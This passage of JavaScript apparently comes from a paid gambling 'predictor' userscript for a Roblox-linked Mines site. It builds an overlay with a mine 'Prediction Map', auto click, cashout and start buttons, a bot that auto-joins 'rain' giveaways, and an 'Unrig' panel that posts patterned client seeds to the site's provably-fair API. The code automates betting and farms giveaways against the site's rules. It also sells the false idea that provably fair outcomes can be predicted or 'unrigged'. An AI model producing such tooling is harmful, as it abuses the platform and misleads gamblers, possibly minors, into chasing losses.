 [data-testid*="user"], [class*="author"] > span,
 .chat-message-username, .chat-username {
 filter: blur(8px) !important;
 user-select: none !important;
 pointer-events: none !important;
 }
 /* Hide profile pictures / avatars */
 [class*="avatar"], [class*="Avatar"], [class*="pfp"],
 [class*="profile-pic"], [class*="profilePic"],
 [class*="user-image"], [class*="userImage"],
 img[src*="avatar"], img[src*="profile"],
 img[src*="roblox.com/headshot"], img[src*="tr.rbxcdn.com"] {
 filter: blur(10px) !important;
 pointer-events: none !important;
 }
 /* Hide wallet balance */
 [class*="balance"], [class*="Balance"], [class*="wallet"] > span {
 filter: blur(8px) !important;
 user-select: none !important;
 }
 `;
 (document.head || document.documentElement).appendChild(s);
 _anonStyleEl = s;
 }

 function applyNoChatMode(enabled) {
 if (_noChatStyleEl) { _noChatStyleEl.remove(); _noChatStyleEl = null; }
 if (!enabled) return;
 const s = document.createElement('style');
 s.id = '_01studios_nochat_css';
 s.textContent = `
 [class*="chat-container"], [class*="chatContainer"],
 [class*="ChatContainer"], [class*="chat-panel"],
 [class*="chatPanel"], [class*="chat-wrapper"],
 [class*="ChatWrapper"], [class*="sidebar-chat"],
 [id*="chat"], aside[class*="chat"],
 [class*="right-sidebar"], [class*="rightSidebar"] {
 display: none !important;
 width: 0 !important;
 max-width: 0 !important;
 overflow: hidden !important;
 }
 /* Expand game area to fill space */
 [class*="game-container"], [class*="gameContainer"],
 [class*="main-content"], [class*="mainContent"],
 main, [class*="content-area"] {
 max-width: 100% !important;
 width: 100% !important;
 }
 `;
 (document.head || document.documentElement).appendChild(s);
 _noChatStyleEl = s;
 }

 function renderSessionSection() {
 function fmtTime(ms) {
 var s = Math.floor(ms / 1000);
 var h = Math.floor(s / 3600); s %= 3600;
 var m = Math.floor(s / 60); s %= 60;
 return (h > 0 ? h + 'h ' : '') + (m > 0 ? m + 'm ' : '') + s + 's';
 }
 var elapsed = fmtTime(Date.now() - _sessionStartTime);
 return `<div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:12px;margin-top:10px;"><div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;font-weight:600;margin-bottom:10px;">Session</div><div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;"><div style="text-align:center;"><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:3px;">TIMER</div><div id="_01studios_session_timer" style="color:${accentColor};font-size:16px;font-weight:700;">${elapsed}</div></div><div style="text-align:center;"><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:3px;">GAMES PLAYED</div><div id="_01studios_session_games" style="color:${accentColor};font-size:16px;font-weight:700;">${_sessionGamesPlayed}</div></div></div></div>`;
 }

    function showRainNotification(msg, color) {
        var existing = document.getElementById('_01studios_rain_notif');
        if (existing) existing.remove();
        var notif = document.createElement('div');
        notif.id = '_01studios_rain_notif';
        notif.style.cssText = 'position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#141414;border:1.5px solid ' + color + ';border-radius:10px;padding:10px 18px;z-index:2147483648;box-shadow:0 4px 20px rgba(0,0,0,0.6);font-family:Segoe UI,system-ui,sans-serif;cursor:pointer;display:flex;align-items:center;gap:8px;';
        notif.innerHTML = '<div style="color:' + color + ';font-size:11px;font-weight:700;">' + msg + '</div>';
        notif.addEventListener('click', function() { notif.remove(); });
        document.body.appendChild(notif);
        setTimeout(function() { if (notif.parentNode) notif.remove(); }, 5000);
    }

    function startRainPoller() {
        if (_rainPollerStarted) return;
        _rainPollerStarted = true;
        setInterval(function() {
            if (!_rainAutoJoin) return;
            var joinBtns = document.querySelectorAll('button');
            var rainBtn = null;
            joinBtns.forEach(function(btn) {
                var txt = (btn.textContent || '').toLowerCase().trim();
                var parent = btn.parentElement;
                var inRain = false;
                var el = btn;
                for (var d = 0; d < 6 && el; d++) {
                    var cls = (el.className || '').toLowerCase();
                    if (cls.includes('rain') || cls.includes('drop')) { inRain = true; break; }
                    el = el.parentElement;
                }
                if (inRain && (txt.includes('join') || txt === 'join')) rainBtn = btn;
                if (!rainBtn && txt === 'join rain') rainBtn = btn;
            });
            if (!rainBtn) rainBtn = document.querySelector('[class*="rain"] button, [class*="Rain"] button');
            if (rainBtn && !rainBtn._01_joined) {
                rainBtn._01_joined = true;
                _rainLastJoinTime = Date.now();
                _rainJoinCount++;
                rainBtn.click();
                showRainNotification('Joined rain drop! (' + _rainJoinCount + ' total)', '#00c97a');
                var c1 = document.getElementById('_01studios_rain_count');
                var c2 = document.getElementById('_01studios_t_rain_count');
                if (c1) c1.textContent = _rainJoinCount;
                if (c2) c2.textContent = _rainJoinCount;
            }
        }, 2000);
    }

    function renderRainSection() {
        return '<div style="background:' + CARD_BG + ';border:1px solid ' + CARD_BORDER + ';border-radius:12px;padding:12px;margin-top:10px;">' +
            '<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">' +
                '<div style="color:' + TEXT_DIM + ';font-size:10px;letter-spacing:2px;font-weight:600;">Rain Joiner</div>' +
                '<div id="_01studios_rain_toggle" style="width:34px;height:18px;border-radius:9px;background:' + (_rainAutoJoin ? '#00c97a' : '#333') + ';position:relative;cursor:pointer;transition:background 0.2s;">' +
                    '<div style="width:14px;height:14px;border-radius:50%;background:#fff;position:absolute;top:2px;left:' + (_rainAutoJoin ? '18px' : '2px') + ';transition:left 0.2s;"></div>' +
                '</div>' +
            '</div>' +
            '<div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">' +
                '<div style="text-align:center;"><div style="color:' + TEXT_DIM + ';font-size:9px;margin-bottom:3px;">JOINS</div><div id="_01studios_rain_count" style="color:' + accentColor + ';font-size:16px;font-weight:700;">' + _rainJoinCount + '</div></div>' +
                '<div style="text-align:center;"><div style="color:' + TEXT_DIM + ';font-size:9px;margin-bottom:3px;">STATUS</div><div id="_01studios_rain_status" style="color:#00c97a;font-size:11px;font-weight:700;">' + (_rainAutoJoin ? 'Watching' : 'Off') + '</div></div>' +
            '</div>' +
        '</div>';
    }

 function renderBankrollSection() {
 return `<div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:12px;"><div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;font-weight:600;margin-bottom:10px;">BANKROLL</div><div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;"><div><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:3px;">Base Bet</div><input id="_01studios_base_bet" type="number" min="1" value="${baseBet}" style="width:100%;background:#111;border:1px solid #333;color:${accentColor};border-radius:6px;padding:4px 8px;font-size:12px;box-sizing:border-box;"></div><div><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:3px;">Suggested</div><div id="_01studios_suggested_bet" style="background:#111;border:1px solid #333;color:#00c97a;border-radius:6px;padding:5px 8px;font-size:12px;font-weight:700;">${currentBet}</div></div><div><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:3px;">Stop Loss</div><input id="_01studios_stop_loss" type="number" min="0" value="${settings.stopLoss||0}" style="width:100%;background:#111;border:1px solid #333;color:#e05555;border-radius:6px;padding:4px 8px;font-size:12px;box-sizing:border-box;"></div><div><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:3px;">Take Profit</div><input id="_01studios_take_profit" type="number" min="0" value="${settings.takeProfit||0}" style="width:100%;background:#111;border:1px solid #333;color:#00c97a;border-radius:6px;padding:4px 8px;font-size:12px;box-sizing:border-box;"></div></div></div>`;
 }

 function renderGridSection() {
 return `<div><div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;"><div style="color:${TEXT_DIM};font-size:10px;letter-spacing:2px;font-weight:600;">Prediction Map</div><span id="_01studios_grid_badge" style="display:none;">${gridSize}×${gridSize} · ${mineCount} mines</span></div><div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:14px;padding:12px;"><div id="_01studios_grid" style="display:grid;grid-template-columns:repeat(5,1fr);gap:5px;">${buildGridCells()}</div></div><div style="display:none;justify-content:space-between;align-items:center;margin-top:8px;padding:0 2px;"><div style="display:flex;align-items:center;gap:6px;"><span style="color:${TEXT_DIM};font-size:9px;">MINES</span><button id="_01studios_mine_dec" style="background:#2a2a2a;border:1px solid #333;color:${TEXT_DIM};width:22px;height:22px;border-radius:6px;cursor:pointer;font-size:13px;">−</button><span id="_01studios_mine_count" style="color:${accentColor};font-size:15px;font-weight:700;min-width:16px;text-align:center;">${mineCount}</span><button id="_01studios_mine_inc" style="background:#2a2a2a;border:1px solid #333;color:${TEXT_DIM};width:22px;height:22px;border-radius:6px;cursor:pointer;font-size:13px;">+</button></div><button id="_01studios_round_id" style="font-size:9px;color:${TEXT_DIM};font-family:monospace;background:#1a1a1a;border:1px solid #333;cursor:pointer;padding:3px 8px;border-radius:6px;transition:all 0.15s;letter-spacing:0.5px;" onmouseover="this.style.borderColor='${accentColor}';this.style.color='${accentColor}'" onmouseout="this.style.borderColor='#333';this.style.color='${TEXT_DIM}'" title="Click to see Round ID">Round ID</button></div></div>`;
 }

 function renderStrategyBar() {
 const optimal = findOptimalCashout(mineCount, gridSize * gridSize);
 const nextP = nextClickProb(mineCount, 0, gridSize * gridSize);
 return `<div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:10px 12px;margin-top:10px;"><div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;text-align:center;"><div><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:2px;">NEXT CLICK</div><div id="_01studios_next_prob" style="color:${nextP>0.7?'#00c97a':nextP>0.4?accentColor:'#e05555'};font-size:14px;font-weight:700;">${(nextP*100).toFixed(0)}%</div></div><div><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:2px;">CASHOUT AT</div><div id="_01studios_optimal_tiles" style="color:${accentColor};font-size:14px;font-weight:700;">${optimal.tiles} tiles</div></div><div><div style="color:${TEXT_DIM};font-size:9px;margin-bottom:2px;">TARGET MULT</div><div id="_01studios_target_mult" style="color:${accentColor};font-size:14px;font-weight:700;">${optimal.mult.toFixed(2)}x</div></div></div><div style="margin-top:8px;"><div style="background:#111;border-radius:3px;height:3px;overflow:hidden;"><div id="_01studios_next_prob_bar" style="height:100%;width:${(nextP*100).toFixed(0)}%;background:linear-gradient(90deg,#e05555,${accentColor},#00c97a);border-radius:3px;transition:width 0.3s;"></div></div></div></div>`;
 }

 function renderFooterBar() {
 return `
 <div style="display:flex;gap:6px;margin-top:12px;flex-wrap:wrap;">
 <button id="_01studios_autopress" style="flex:1;min-width:80px;padding:10px 6px;background:#1a1a1a;border:1.5px solid #333;color:${TEXT_DIM};border-radius:10px;cursor:pointer;font-size:10px;font-weight:700;letter-spacing:0.5px;">AUTO CLICK</button>
 <button id="_01studios_autocashout" style="flex:1;min-width:80px;padding:10px 6px;background:#1a1a1a;border:1.5px solid #333;color:${TEXT_DIM};border-radius:10px;cursor:pointer;font-size:10px;font-weight:700;letter-spacing:0.5px;">AUTO CASH</button>
 <button id="_01studios_autostart" style="flex:1;min-width:80px;padding:10px 6px;background:#1a1a1a;border:1.5px solid #333;color:${TEXT_DIM};border-radius:10px;cursor:pointer;font-size:10px;font-weight:700;letter-spacing:0.5px;">AUTO START</button>
 <button id="_01studios_regen" style="padding:10px 12px;background:#2a2a2a;border:1px solid #333;color:${TEXT_DIM};border-radius:10px;cursor:pointer;font-size:10px;font-weight:700;" title="Re-run prediction on current game">⟳</button>
 <button id="_01studios_newgame" style="padding:10px 12px;background:#2a2a2a;border:1px solid #333;color:${TEXT_DIM};border-radius:10px;cursor:pointer;font-size:10px;font-weight:700;" title="Reset">R</button>
 </div>
 <div style="display:flex;align-items:center;gap:8px;margin-top:8px;">
 <div id="_01studios_game_status_dot" style="display:none;width:10px;height:10px;border-radius:50%;background:#e05555;box-shadow:0 0 6px #e0555588;flex-shrink:0;transition:all 0.3s;"></div>
 <div id="_01studios_status_text" style="font-size:10px;color:transparent;flex:1;user-select:none;pointer-events:none;"></div>
 </div>
 <div style="display:none;align-items:center;justify-content:space-between;margin-top:6px;gap:6px;">
 <div style="display:none;color:#333;font-size:9px;font-weight:600;letter-spacing:1px;">Upcoming</div>
 <div id="_01studios_regime_badge" style="display:none;font-size:9px;font-weight:700;letter-spacing:1px;padding:2px 7px;border-radius:4px;border:1px solid #333;color:#555;">NEUTRAL</div>
 </div>
 <div id="_01studios_nonce_lookahead" style="display:none;gap:4px;margin-top:4px;"></div>`;
 }

 function openModal(type) {
 closeModal();
 const overlay = document.createElement('div');
 overlay.id = '_01studios_modal_overlay';
 overlay.style.cssText = `position:fixed;inset:0;background:rgba(0,0,0,0.6);z-index:2147483646;display:flex;align-items:center;justify-content:center;`;
 overlay.addEventListener('click', e => { if(e.target===overlay) closeModal(); });

 const modal = document.createElement('div');
 modal.style.cssText = `background:${DARK_BG};border:1px solid ${CARD_BORDER};border-radius:16px;padding:24px;min-width:360px;max-width:460px;box-shadow:0 20px 60px rgba(0,0,0,0.9);position:relative;`;

 if (type === 'license') {
 modal.innerHTML = `
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:18px;">
 <span style="color:${accentColor};font-size:13px;font-weight:700;letter-spacing:2px;">- LICENSE INFO</span>
 <button id="_01studios_modal_close" style="background:#2a2a2a;border:1px solid #333;color:#888;width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px;">X</button>
 </div>
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:10px;padding:16px;margin-bottom:16px;text-align:center;">
 
 <div style="color:${TEXT_MAIN};font-size:13px;font-weight:700;margin-bottom:4px;">License Active</div>
 <div style="color:#555;font-size:11px;">Managed by 01 Studio's Loader</div>
 </div>
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:10px;padding:12px;margin-bottom:16px;text-align:center;">
 <div style="color:#555;font-size:10px;">To manage your license, use the Discord bot or contact support.</div>
 </div>`;

 } else if (type === 'settings') {
 const AC = accentColor;
 const THEMES = [
 { id:'default', color:'#f5c518', label:'Default' },
 { id:'red', color:'#e05555', label:'Red' },
 { id:'blue', color:'#4fc3f7', label:'Blue' },
 { id:'green', color:'#00c97a', label:'Green' },
 { id:'purple', color:'#b57bee', label:'Purple' },
 { id:'pink', color:'#f06292', label:'Pink' },
 { id:'orange', color:'#ff9800', label:'Orange' },
 { id:'white', color:'#f0f0f0', label:'White' },
 ];
 const DELAYS = [
 { id:'instant', label:'Instant (0s)' },
 { id:'fast', label:'Fast (0.3s)' },
 { id:'normal', label:'Normal (0.8s)' },
 { id:'slow', label:'Slow (1.5s)' },
 ];
 function toggleStyle(id, checked) {
 return `background:${checked?AC+'22':CARD_BG};border:1.5px solid ${checked?AC:CARD_BORDER};border-radius:10px;padding:10px 14px;display:flex;justify-content:space-between;align-items:center;cursor:pointer;user-select:none;`;
 }
 function toggleBtn(id, checked) {
 return `<div id="${id}_track" style="width:38px;height:20px;border-radius:10px;background:${checked?AC:'#333'};position:relative;flex-shrink:0;transition:background 0.2s;">
 <div id="${id}_thumb" style="width:16px;height:16px;border-radius:50%;background:#fff;position:absolute;top:2px;left:${checked?'20px':'2px'};transition:left 0.2s;"></div>
 </div>`;
 }
 const ap = settings.autoPredict !== false;
 const sr = settings.showRevealed !== false;
 const as_ = settings.autoSync !== false;
 const al = !!settings.alertCashout;
 const se = !!settings.soundEffects;
 const ra = !!settings.rigAlertSound;
 const pu = !!settings.preemptiveUnrig;
 const anim = settings.animations !== false;
 const hl = settings.highlightGrid !== false;
 const ct = !!settings.clickThrough;
 const delay = settings.predDelay || 'normal';
 const customColor = settings.customAccent || '';
 modal.style.minWidth = '440px';
 modal.style.maxWidth = '480px';
 modal.innerHTML = `
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
 <div style="display:flex;align-items:center;gap:8px;">
 <span style="color:${AC};font-size:13px;font-weight:700;letter-spacing:1px;">Settings</span>
 <span style="color:#444;font-size:10px;">01ST v${VERSION}</span>
 </div>
 <button id="_01studios_modal_close" style="background:#2a2a2a;border:1px solid #333;color:#888;width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px;">X</button>
 </div>

 <!-- PRIVACY -->
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:12px 14px;margin-bottom:10px;">
 <div style="color:${AC};font-size:9px;letter-spacing:2px;font-weight:700;margin-bottom:10px;border-bottom:1px solid ${AC}22;padding-bottom:6px;">PRIVACY</div>
 <div style="display:flex;flex-direction:column;gap:8px;">
 <label style="${toggleStyle('anon',!!settings.anonMode)}">
 <div>
 <div style="color:${TEXT_MAIN};font-size:11px;">Anonymous Mode</div>
 <div style="color:#555;font-size:8px;margin-top:1px;">Blurs usernames, avatars & balance</div>
 </div>
 ${toggleBtn('_01studios_s_anon', !!settings.anonMode)}
 </label>
 <label style="${toggleStyle('nochat',!!settings.noChatMode)}">
 <div>
 <div style="color:${TEXT_MAIN};font-size:11px;">No Chat Mode</div>
 <div style="color:#555;font-size:8px;margin-top:1px;">Hides the chat sidebar entirely</div>
 </div>
 ${toggleBtn('_01studios_s_nochat', !!settings.noChatMode)}
 </label>
 </div>
 </div>

 <!-- GAMEPLAY -->
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:12px 14px;margin-bottom:10px;">
 <div style="color:#555;font-size:9px;letter-spacing:2px;font-weight:600;margin-bottom:10px;border-bottom:1px solid #222;padding-bottom:6px;">GAMEPLAY</div>
 <div style="display:flex;flex-direction:column;gap:8px;">
 <label style="${toggleStyle('ap',ap)}">
 <span style="color:${TEXT_MAIN};font-size:11px;">Auto-predict on game start</span>
 ${toggleBtn('_01studios_s_autopredict', ap)}
 </label>
 <label style="${toggleStyle('as',as_)}">
 <span style="color:${TEXT_MAIN};font-size:11px;">Auto-sync mine count</span>
 ${toggleBtn('_01studios_s_autosync', as_)}
 </label>
 <label style="${toggleStyle('ct',ct)}">
 <span style="color:${TEXT_MAIN};font-size:11px;">Click-through cells</span>
 ${toggleBtn('_01studios_s_clickthrough', ct)}
 </label>
 </div>
 </div>

 <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:10px;">
 <!-- AUDIO -->
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:12px 14px;">
 <div style="color:#555;font-size:9px;letter-spacing:2px;font-weight:600;margin-bottom:10px;">AUDIO</div>
 <label style="${toggleStyle('se',se)}margin-bottom:8px;">
 <span style="color:${TEXT_MAIN};font-size:11px;">Sound effects</span>
 ${toggleBtn('_01studios_s_sound', se)}
 </label>
 <label style="${toggleStyle('ra',ra)}margin-bottom:0;">
 <div>
 <div style="color:${TEXT_MAIN};font-size:11px;">Rig alert voice</div>
 <div style="color:#555;font-size:8px;margin-top:1px;">TTS on rig detect</div>
 </div>
 ${toggleBtn('_01studios_s_rigalert', ra)}
 </label>
 </div>
 <!-- PROTECTION -->
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:12px 14px;">
 <div style="color:#555;font-size:9px;letter-spacing:2px;font-weight:600;margin-bottom:10px;">PROTECTION</div>
 <label style="${toggleStyle('pu',pu)}margin-bottom:8px;">
 <div>
 <div style="color:${TEXT_MAIN};font-size:11px;">Preemptive unrig</div>
 <div style="color:#555;font-size:8px;margin-top:1px;">Auto-rotate every 5 wins</div>
 </div>
 ${toggleBtn('_01studios_s_preemptive', pu)}
 </label>
 <label style="${toggleStyle('an',anim)}margin-bottom:0;">
 <span style="color:${TEXT_MAIN};font-size:11px;">Animations</span>
 ${toggleBtn('_01studios_s_anim', anim)}
 </label>
 </div>
 </div>

 <!-- DISPLAY -->
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:12px 14px;margin-bottom:10px;">
 <div style="color:#555;font-size:9px;letter-spacing:2px;font-weight:600;margin-bottom:10px;border-bottom:1px solid #222;padding-bottom:6px;">DISPLAY</div>
 <div style="display:flex;flex-direction:column;gap:8px;margin-bottom:10px;">
 <label style="${toggleStyle('sr',sr)}">
 <span style="color:${TEXT_MAIN};font-size:11px;">Show revealed cells</span>
 ${toggleBtn('_01studios_s_showrevealed', sr)}
 </label>
 <label style="${toggleStyle('hl',hl)}">
 <span style="color:${TEXT_MAIN};font-size:11px;">Highlight site grid</span>
 ${toggleBtn('_01studios_s_highlight', hl)}
 </label>
 </div>
 <div style="color:#555;font-size:9px;margin-bottom:6px;">Theme</div>
 <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:10px;">
 ${THEMES.map(t => `<div class="_01studios_theme_swatch" data-color="${t.color}" title="${t.label}" style="width:22px;height:22px;border-radius:50%;background:${t.color};cursor:pointer;border:2px solid ${accentColor===t.color?'#fff':'transparent'};box-shadow:${accentColor===t.color?'0 0 0 1px '+t.color:'none'};transition:all 0.15s;"></div>`).join('')}
 </div>
 <div style="display:flex;gap:8px;align-items:center;">
 <input id="_01studios_s_colorwheel" type="color" value="${customColor||AC}" style="width:32px;height:24px;border:none;border-radius:6px;cursor:pointer;background:none;padding:0;">
 <span id="_01studios_s_colorhex" style="color:${AC};font-size:10px;font-family:monospace;">${customColor||AC}</span>
 <span style="color:#444;font-size:8px;">Custom color</span>
 </div>
 </div>

 <!-- PERFORMANCE -->
 <div style="background:${CARD_BG};border:1px solid ${CARD_BORDER};border-radius:12px;padding:12px 14px;margin-bottom:12px;">
 <div style="color:#555;font-size:9px;letter-spacing:2px;font-weight:600;margin-bottom:10px;">PERFORMANCE</div>
 <div style="display:flex;justify-content:space-between;align-items:center;">
 <span style="color:${TEXT_MAIN};font-size:11px;">Prediction delay</span>
 <select id="_01studios_s_delay" style="background:#111;border:1px solid #333;color:${AC};border-radius:6px;padding:4px 8px;font-size:10px;cursor:pointer;">
 ${DELAYS.map(d => `<option value="${d.id}" ${delay===d.id?'selected':''}>${d.label}</option>`).join('')}
 </select>
 </div>
 </div>

 <div style="display:flex;gap:8px;">
 <button id="_01studios_reset_pos_btn" style="flex:1;padding:10px;background:#2a2a2a;border:1px solid #333;color:#888;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;">Reset</button>
 <button id="_01studios_settings_save" style="flex:2;padding:10px;background:linear-gradient(135deg,${AC}22,${AC}44);border:1.5px solid ${AC};color:${AC};border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;letter-spacing:1px;">Save</button>
 </div>`;

 } else if (type === 'unrig') {
 let unrigMode = 'soft';
 let unrigPattern = 'pattern';

 function randHex(n) {
 let s = '';
 const chars = '0123456789abcdef';
 for (let i = 0; i < n; i++) s += chars[Math.floor(Math.random() * 16)];
 return s;
 }
 function randAlnum(n) {
 let s = '';
 const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
 for (let i = 0; i < n; i++) s += chars[Math.floor(Math.random() * chars.length)];
 return s;
 }
 function generateSeed(mode, pattern) {
 const ts = Date.now().toString(36);
 const r8 = randHex(8);
 const r16 = randHex(16);
 const r32 = randHex(32);
 const entropyLen = mode === 'soft' ? 8 : mode === 'medium' ? 16 : 32;
 const base = randHex(entropyLen);

 switch (pattern) {
 case 'pattern':
 return (mode === 'soft'
 ? `c0da-${ts}-${r8}`
 : mode === 'medium'
 ? `c0da-${ts}-${r8}-${randHex(8)}`
 : `c0da-${ts}-${r16}-${randHex(16)}`);

 case 'entropy':
 return base + randHex(entropyLen);

 case 'mirror':
 const half = randHex(entropyLen);
 return half + half.split('').reverse().join('');

 case 'cascade':
 const seg1 = randHex(8);
 const seg2 = (parseInt(seg1, 16) ^ parseInt(ts.padStart(8,'0').slice(-8), 16)).toString(16).padStart(8,'0');
 const seg3 = mode !== 'soft' ? (parseInt(seg2, 16) ^ parseInt(r8, 16)).toString(16).padStart(8,'0') : '';
 const seg4 = mode === 'aggressive' ? (parseInt(seg3, 16) ^ parseInt(randHex(8), 16)).toString(16).padStart(8,'0') : '';
 return [seg1, seg2, seg3, seg4].filter(Boolean).join('-');

 case 'inverse':
 const inv = ts.split('').reverse().join('');
 return inv + '-' + base;

 case 'hybrid':
 return randAlnum(4) + '-' + randHex(8) + '-' + ts + '-' + randAlnum(4);

 default:
 return randHex(32);
 }
 }

 const UNRIG_MODES = [
 { id: 'soft', icon: '\uD83C\uDF0A', label: 'Soft', desc: 'Subtle seed shift — low disruption' },
 { id: 'medium', icon: '\u26A1', label: 'Medium', desc: 'Moderate seed rotation with timestamp variance' },
 { id: 'aggressive', icon: '\uD83D\uDD25', label: 'Aggressive', desc: 'Full entropy flush — maximum randomness' },
 ];
 const UNRIG_PATTERNS = [
 { id: 'pattern', icon: '\u25C6', label: 'Pattern' },
 { id: 'entropy', icon: '\uD83C\uDF00', label: 'Entropy' },
 { id: 'mirror', icon: '\uD83D\uDDBC', label: 'Mirror' },
 { id: 'cascade', icon: '\u21BB', label: 'Cascade' },
 { id: 'inverse', icon: '\u21C5', label: 'Inverse' },
 { id: 'hybrid', icon: '\u2736', label: 'Hybrid' },
 ];

 function renderUnrigModes() {
 return UNRIG_MODES.map(m => {
 const on = unrigMode === m.id;
 return `<div class="_01studios_unrig_mode" data-mode="${m.id}" style="display:flex;justify-content:space-between;align-items:center;background:${on?accentColor+'18':CARD_BG};border:1.5px solid ${on?accentColor:CARD_BORDER};border-radius:10px;padding:12px 14px;cursor:pointer;margin-bottom:8px;">
 <div style="display:flex;align-items:center;gap:10px;">
 
 <div><div style="color:${on?accentColor:TEXT_MAIN};font-size:12px;font-weight:700;">${m.label}</div><div style="color:#555;font-size:9px;margin-top:2px;">${m.desc}</div></div>
 </div>
 <div style="width:14px;height:14px;border-radius:50%;border:2px solid ${on?accentColor:'#444'};background:${on?accentColor:'transparent'};"></div>
 </div>`;
 }).join('');
 }
 function renderUnrigPatterns() {
 return `<div style="display:grid;grid-template-columns:repeat(3,1fr);gap:8px;">${UNRIG_PATTERNS.map(p => {
 const on = unrigPattern === p.id;
 return `<div class="_01studios_unrig_pat" data-pat="${p.id}" style="background:${on?accentColor+'18':CARD_BG};border:1.5px solid ${on?accentColor:CARD_BORDER};border-radius:10px;padding:10px;text-align:center;cursor:pointer;">
 
 <div style="color:${on?accentColor:TEXT_DIM};font-size:10px;font-weight:700;">${p.label}</div>
 </div>`;
 }).join('')}</div>`;
 }

 modal.style.minWidth = '400px';
 modal.style.maxWidth = '440px';
 modal.innerHTML = `
 <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;">
 <div style="display:flex;align-items:center;gap:8px;">
 <span style="color:#e05555;font-size:13px;font-weight:700;letter-spacing:1px;">Unrig</span>
 <span style="color:${TEXT_DIM};font-size:12px;">Client Seed Reset</span>
 </div>
 <button id="_01studios_modal_close" style="background:#2a2a2a;border:1px solid #333;color:#888;width:28px;height:28px;border-radius:7px;cursor:pointer;font-size:16px;">X</button>
 </div>
 <div style="color:#555;font-size:9px;letter-spacing:2px;font-weight:600;margin-bottom:8px;">MODE</div>
 <div id="_01studios_unrig_modes">${renderUnrigModes()}</div>
 <div style="color:#555;font-size:9px;letter-spacing:2px;font-weight:600;margin-top:14px;margin-bottom:8px;">SEED PATTERN</div>
 <div id="_01studios_unrig_patterns">${renderUnrigPatterns()}</div>
 <div style="color:#444;font-size:9px;margin-top:12px;border-top:1px solid #222;padding-top:8px;">Posts new seed to /api/provably-fair/clientSeed</div>
 <div style="display:flex;gap:8px;margin-top:12px;">
 <button id="_01studios_unrig_cancel" style="flex:1;padding:10px;background:#2a2a2a;border:1px solid #333;color:#888;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;">Cancel</button>
 <button id="_01studios_unrig_apply" style="flex:2;padding:10px;background:linear-gradient(135deg,#e0555522,#e0555544);border:1.5px solid #e05555;color:#e05555;border-radius:8px;cursor:pointer;font-size:11px;font-weight:700;letter-spacing:1px;">Apply</button>
 </div>
 <div id="_01studios_unrig_status" style="text-align:center;font-size:10px;color:#555;margin-top:8px;min-height:14px;"></div>`;

 overlay.appendChild(modal);
 document.body.appendChild(overlay);
 modal.querySelector('#_01studios_modal_close').addEventListener('click', closeModal);
 modal.querySelector('#_01studios_unrig_cancel').addEventListener('click', closeModal);

 function refreshUnrig() {
 modal.querySelector('#_01studios_unrig_modes').innerHTML = renderUnrigModes();
 modal.querySelector('#_01studios_unrig_patterns').innerHTML = renderUnrigPatterns();
 attachUnrigClicks();
 }
 function attachUnrigClicks() {
 modal.querySelectorAll('._01studios_unrig_mode').forEach(el => {
 el.addEventListener('click', () => { unrigMode = el.dataset.mode; refreshUnrig(); });
 });
 modal.querySelectorAll('._01studios_unrig_pat').forEach(el => {
 el.addEventListener('click', () => { unrigPattern = el.dataset.pat; refreshUnrig(); });
 });
 }
 attachUnrigClicks();

 modal.querySelector('#_01studios_unrig_apply').addEventListener('click', async () => {
 const btn = modal.querySelector('#_01studios_unrig_apply');
 const statusEl = modal.querySelector('#_01studios_unrig_status');
 const newSeed = generateSeed(unrigMode, unrigPattern);
 btn.textContent = ' Applying...';
 btn.disabled = true;
 statusEl.style.color = '#555';
 statusEl.textContent = 'Sending: ' + newSeed;
 try {
 const res = await fetch('/api/provably-fair/clientSeed', {
 method: 'POST',
 credentials: 'include',
 headers: { 'Content-Type': 'application/json' },
 body: JSON.stringify({ clientSeed: newSeed })
 });
 const data = await res.json().catch(() => ({}));
 if (res.ok && data.success !== false) {
 statusEl.style.color = '#00c97a';
 statusEl.textContent = 'OK Seed updated: ' + newSeed;
 btn.textContent = 'OK Done!';
 btn.style.borderColor = '#00c97a';
 btn.style.color = '#00c97a';
 setTimeout(() => closeModal(), 1500);
 } else {
 statusEl.style.color = '#e05555';
 statusEl.textContent = '✗ Failed: ' + (data.message || res.status);
 btn.textContent = 'Apply';
 btn.disabled = false;
 }
 } catch (err) {
 statusEl.style.color = '#e05555';
 statusEl.textContent = '✗ Network error';
